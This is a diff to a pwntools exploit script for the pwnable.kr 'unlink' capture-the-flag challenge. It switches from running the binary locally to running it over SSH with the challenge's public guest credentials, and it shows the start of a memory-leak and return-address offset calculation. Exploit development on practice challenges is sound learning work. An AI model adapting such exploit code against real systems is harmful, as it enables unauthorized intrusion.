@@ -1,4 +1,4 @@
-unlink@pwnable:/tmp/u$ cat exp.py
+#unlink@pwnable:/tmp/u$ cat exp.py
 from pwn import *
 
 esp_leak = 0xffefdb54
@@ -6,7 +6,9 @@ ret_addr_location = 0xffefdb64
 
 offset = ret_addr_location -esp_leak 
 
-p = process("/home/unlink/unlink")
+#p = process("/home/unlink/unlink")
+shell = ssh(host='pwnable.kr', user='unlink', password='guest', port=2222)
+p = shell.process(executable="/home/unlink/unlink")
 line = p.recvline()
 print(line)
 esp_leak = int(line.split()[-1], 16)
